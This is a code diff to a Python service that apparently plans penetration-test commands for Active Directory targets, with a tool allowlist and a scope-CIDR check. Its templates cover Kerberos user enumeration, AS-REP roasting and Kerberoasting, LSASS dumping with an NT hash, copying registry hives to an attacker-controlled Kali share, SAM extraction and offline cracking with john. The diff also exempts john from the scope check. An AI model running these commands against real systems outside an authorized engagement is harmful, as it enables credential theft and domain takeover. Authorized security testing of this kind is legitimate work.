@@ -112,6 +112,7 @@ class AgentService:
             "nmap",
             "ldapsearch",
             "kerbrute",
+            "john",
             "lsassy",
             "ntpdate",
             "proxychains",
@@ -121,17 +122,22 @@ class AgentService:
             "systemctl",
             "xfreerdp",
         }
+        self._local_tools_without_target = {"john"}
 
     def build_plan(self, request: AgentPlanRequest) -> AgentPlan:
         target = request.target_ip if request.target_mode == "ip" and request.target_ip else request.scope_cidr
         domain_arg = f" -d {request.domain}" if request.domain else ""
-        domain = request.domain or "<dominio.local>"
+        domain = request.domain or "<domain>"
         username = request.username or "<user>"
         password = request.password or "<password>"
-        nt_hash = request.nt_hash or "<NT>"
+        nt_hash = request.nt_hash or "<hash_nt>"
         share = request.share or "<share>"
+        wordlist = request.wordlist or "<wordlist>"
+        file_path = request.file or "<file>"
+        port = request.port or "<port>"
         users_list = request.users_list or "<users_list>"
         kali_ip = request.kali_ip or "<kali_ip>"
+        ip_dc = request.ip_dc or target or "<ip_dc>"
 
         if request.target_mode == "cidr":
             commands = [
@@ -156,9 +162,9 @@ class AgentService:
                     AgentCommand(
                         phase="service_scan",
                         tool="nmap",
-                        command=f"nmap -sU -p 161 {target}",
-                        purpose="Comprobar SNMP si el host expone UDP/161 o si quieres descartar comunidad publica.",
-                        expected_output="Estado de SNMP y posibles banners o respuestas UDP.",
+                        command=f"nmap -sU -p {port if request.port else '161'} {target}",
+                        purpose="Comprobar UDP en el puerto indicado; por defecto SNMP/161.",
+                        expected_output="Estado UDP y posibles banners o respuestas del servicio.",
                     ),
                 ],
                 "smb_enum": [
@@ -195,14 +201,14 @@ class AgentService:
                     AgentCommand(
                         phase="ldap_enum",
                         tool="ldapsearch",
-                        command=f"ldapsearch -x -H ldap://{target} -D '{username}@{domain}' -w '{password}' -b 'DC=<domain_part>,DC=<domain_part>'",
+                        command=f"ldapsearch -x -H ldap://{ip_dc} -D '{username}@{domain}' -w '{password}' -b 'DC=<domain_part>,DC=<domain_part>'",
                         purpose="Enumerar LDAP autenticado con el usuario indicado.",
                         expected_output="Objetos LDAP relevantes para usuarios, equipos, grupos y descripciones.",
                     ),
                     AgentCommand(
                         phase="ldap_enum",
                         tool="bloodhound-python",
-                        command=f"bloodhound-python -u {username} -p {password} -ns {target} -d {domain} -c all",
+                        command=f"bloodhound-python -u {username} -p {password} -ns {ip_dc} -d {domain} -c all",
                         purpose="Recolectar relaciones AD para BloodHound.",
                         expected_output="JSON de BloodHound para importar en Neo4j/BloodHound.",
                     ),
@@ -211,21 +217,21 @@ class AgentService:
                     AgentCommand(
                         phase="kerberos_enum",
                         tool="ntpdate",
-                        command=f"ntpdate {target}",
+                        command=f"ntpdate {ip_dc}",
                         purpose="Sincronizar hora contra el DC antes de pruebas Kerberos.",
                         expected_output="Hora local alineada con el controlador de dominio.",
                     ),
                     AgentCommand(
                         phase="kerberos_enum",
                         tool="kerbrute",
-                        command=f"kerbrute userenum --dc {target} -d {domain} {users_list}",
+                        command=f"kerbrute userenum --dc {ip_dc} -d {domain} {users_list}",
                         purpose="Validar usuarios por Kerberos usando la lista indicada.",
                         expected_output="Usuarios validos detectados.",
                     ),
                     AgentCommand(
                         phase="kerberos_enum",
                         tool="impacket-GetNPUsers",
-                        command=f"impacket-GetNPUsers -no-pass -usersfile {users_list} -dc-ip {target} {domain}/",
+                        command=f"impacket-GetNPUsers -no-pass -usersfile {users_list} -dc-ip {ip_dc} {domain}/",
                         purpose="Buscar cuentas AS-REP roastables sin password.",
                         expected_output="Hashes AS-REP si existen cuentas vulnerables.",
                     ),
@@ -234,14 +240,14 @@ class AgentService:
                     AgentCommand(
                         phase="credential_checks",
                         tool="impacket-GetUserSPNs",
-                        command=f"impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target} -request -outputfile hashes",
+                        command=f"impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {ip_dc} -request -outputfile {file_path}",
                         purpose="Kerberoasting con las credenciales seleccionadas.",
                         expected_output="Hashes TGS para crackeo offline si hay SPNs.",
                     ),
                     AgentCommand(
                         phase="credential_checks",
                         tool="certipy-ad",
-                        command=f"certipy-ad find -u {username} -p {password} -dc-ip {target} -vulnerable",
+                        command=f"certipy-ad find -u {username} -p {password} -dc-ip {ip_dc} -vulnerable",
                         purpose="Buscar plantillas ADCS vulnerables.",
                         expected_output="Hallazgos ADCS y paths de explotacion si aplican.",
                     ),
@@ -251,6 +257,13 @@ class AgentService:
                         command=f"lsassy -d {domain} -u {username} -H ':{nt_hash}' {target}",
                         purpose="Intentar extracción LSASS con hash NT cuando el usuario sea admin local.",
                         expected_output="Credenciales o hashes recuperados si hay privilegios.",
+                    ),
+                    AgentCommand(
+                        phase="credential_checks",
+                        tool="john",
+                        command=f"john --format=NT --wordlist={wordlist} {file_path}",
+                        purpose="Crackear hashes NT guardados en el fichero indicado.",
+                        expected_output="Passwords recuperadas si el wordlist contiene coincidencias.",
                     ),
                 ],
                 "exploitation": [
@@ -280,14 +293,14 @@ class AgentService:
                     AgentCommand(
                         phase="extraction",
                         tool="impacket-reg",
-                        command=f"impacket-reg '{domain}/{username}:{password}@{target}' backup -o '\\\\{kali_ip}\\recurso'",
+                        command=f"impacket-reg '{domain}/{username}:{password}@{ip_dc}' backup -o '\\\\{kali_ip}\\recurso'",
                         purpose="Extraer hives de registro hacia el share de Kali.",
                         expected_output="SAM, SYSTEM y SECURITY copiados si hay permisos.",
                     ),
                     AgentCommand(
                         phase="extraction",
                         tool="nxc",
-                        command=f"nxc smb {target} -u {username} -p {password} --sam",
+                        command=f"nxc smb {ip_dc} -u {username} -p {password} --sam",
                         purpose="Extraer SAM usando NetExec si las credenciales lo permiten.",
                         expected_output="Hashes locales o error de privilegios.",
                     ),
@@ -596,7 +609,7 @@ class AgentService:
             allowed = ", ".join(sorted(self._allowed_tools))
             raise ValueError(f"Tool not allowed. Allowed tools: {allowed}")
 
-        if scope_cidr not in command:
+        if tool_name not in self._local_tools_without_target and scope_cidr not in command:
             raise ValueError("Command must include the authorized scope CIDR before it can run")
 
         if shutil.which(args[0]) is None:
